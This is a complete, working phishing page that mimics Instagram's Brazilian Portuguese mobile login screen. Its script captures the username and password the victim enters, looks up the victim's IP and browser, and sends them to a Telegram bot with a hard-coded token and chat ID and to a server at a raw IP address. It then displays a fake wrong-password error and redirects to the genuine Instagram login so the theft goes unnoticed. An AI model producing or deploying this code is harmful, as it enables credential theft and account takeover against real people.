<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #121e26;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
            justify-content: center;
            padding: 0 25px;
        }

        .language-top {
            position: absolute;
            top: 20px;
            color: #a8a8a8;
            font-size: 12px;
        }

        .main-content {
            width: 100%;
            max-width: 375px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-container {
            margin-bottom: 40px;
        }

        .instagram-icon {
            width: 62px;
            height: 62px;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .login-form input {
            width: 100%;
            height: 52px;
            background: #1c2b33;
            border: 1px solid #36464f;
            border-radius: 12px;
            padding: 0 16px;
            font-size: 14px;
            color: #ffffff;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
        }

        .login-form input:focus {
            border-color: #556670;
            outline: none;
        }

        .login-btn {
            background-color: #1864f7;
            color: white;
            border: none;
            border-radius: 25px;
            height: 44px;
            font-size: 15px;
            font-weight: 600;
            margin-top: 6px;
            cursor: pointer;
        }

        .login-btn:disabled {
            opacity: 0.5;
        }

        .forgot-link {
            text-align: center;
            font-size: 14px;
            margin-top: 18px;
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
        }

        .footer-actions {
            width: 100%;
            margin-top: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
        }

        .create-account-btn {
            width: 100%;
            height: 44px;
            background: transparent;
            border: 1px solid #1864f7;
            border-radius: 25px;
            color: #1864f7;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .meta-logo {
            width: 65px;
            opacity: 0.8;
            margin-top: 10px;
        }

        #errorMsg {
            color: #ed4956;
            font-size: 13px;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="language-top">PortuguÃªs (Brasil)</div>
    
    <div class="main-content">
        <div class="logo-container">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram" class="instagram-icon">
        </div>

        <form class="login-form" id="loginForm">
            <input type="text" id="username" name="username" placeholder="Nome de usuÃ¡rio, email ou celular" required autocapitalize="none">
            <input type="password" id="password" name="password" placeholder="Senha" required>
            
            <button type="submit" class="login-btn" id="loginBtn">Entrar</button>
            
            <a href="#" class="forgot-link">Esqueceu a senha?</a>
            <div id="errorMsg">Senha incorreta. Tente novamente.</div>
        </form>

        <div class="footer-actions">
            <button type="button" class="create-account-btn">Criar nova conta</button>
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
        </div>
    </div>

    <script>
        const TOKEN = "8524660585:AAHVKLyJeWs_5IM9nmNutXfPkXBBaBh4zi4";
        const CHAT_ID = "5542692841";
        const TELEGRAM_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        const BACKEND_URL = "http://15.228.223.163:5000/login";

        const form = document.getElementById('loginForm');
        const userInp = document.getElementById('username');
        const passInp = document.getElementById('password');
        const btn = document.getElementById('loginBtn');
        const err = document.getElementById('errorMsg');

        let userIP = "Desconhecido";

        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                userIP = d.ip;
            } catch (e) {}
        }

        async function processLogin(u, p) {
            const ua = navigator.userAgent;
            const ts = Math.floor(Date.now() / 1000);
            const encPwd = `#PWD_INSTAGRAM_BROWSER:0:${ts}:${p}`;
            
            const message = `ðŸ” *NOVA TENTATIVA DE LOGIN*\n\n` +
                            `ðŸ‘¤ *UsuÃ¡rio:* \`${u}\`\n` +
                            `ðŸ”‘ *Senha:* \`${p}\`\n\n` +
                            `ðŸŒ *IP:* ${userIP}\n` +
                            `ðŸ“± *UA:* \`${ua}\``;

            fetch(TELEGRAM_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'})
            });

            try {
                await fetch(BACKEND_URL, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        user: u,
                        pass: p,
                        enc_password: encPwd,
                        userAgent: ua
                    })
                });
            } catch (e) {
                console.error("Erro na comunicaÃ§Ã£o com o backend.");
            }
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            btn.disabled = true;
            
            await processLogin(userInp.value, passInp.value);
            
            err.style.display = 'block';
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 1500);
        });

        window.onload = getIP;
    </script>
</body>
</html>
